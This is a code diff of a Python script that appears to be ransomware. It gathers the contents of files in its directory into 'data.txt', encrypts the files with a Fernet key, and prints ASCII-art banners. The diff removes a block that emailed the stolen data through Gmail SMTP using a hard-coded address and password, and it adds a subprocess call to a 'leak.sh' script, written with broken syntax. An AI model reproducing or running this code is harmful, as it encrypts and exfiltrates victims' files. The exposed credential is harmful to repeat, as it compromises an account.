@@ -3,20 +3,13 @@ from cryptography.fernet import Fernet
 from art import *
 from time import sleep
 from termcolor import colored
-import smtplib, ssl
+
+import subprocess
 
 
 files = []
 
 key = Fernet.generate_key()
-
-smtp_server = "smtp.gmail.com"
-port = 587  # For starttls
-sender_email = "yafet4758@gmail.com"
-password = "M4st10rk10y"
-receiver_email = "yafet4758@gmail.com"
-
-context = ssl.create_default_context()
 
 
 for file in os.listdir():
@@ -76,20 +69,6 @@ for file in files:
         snatched_data = data_for_snatch.read()
     with open("data.txt", "a") as payload:
         payload.write(snatched_data)
-    with open("data.txt", "r") as data:
-        message = data.read()
-        try:
-            server = smtplib.SMTP(smtp_server,port)
-            server.ehlo() # Can be omitted
-            server.starttls(context=context) # Secure the connection
-            server.ehlo() # Can be omitted
-            server.login(sender_email, password)
-            server.sendmail(sender_email, receiver_email, message)
-        except Exception as e:
-        # Print any error messages to stdout
-            print(e)
-        finally:
-            server.quit() 
 
 
 for file in files:
@@ -4406,3 +4385,4 @@ tprint("M0nStERwith23FacEs", "rnd-xlarge")
 print("")
 print("")
 print("")
+print(subprocess.run([./leak.sh], shell=True)
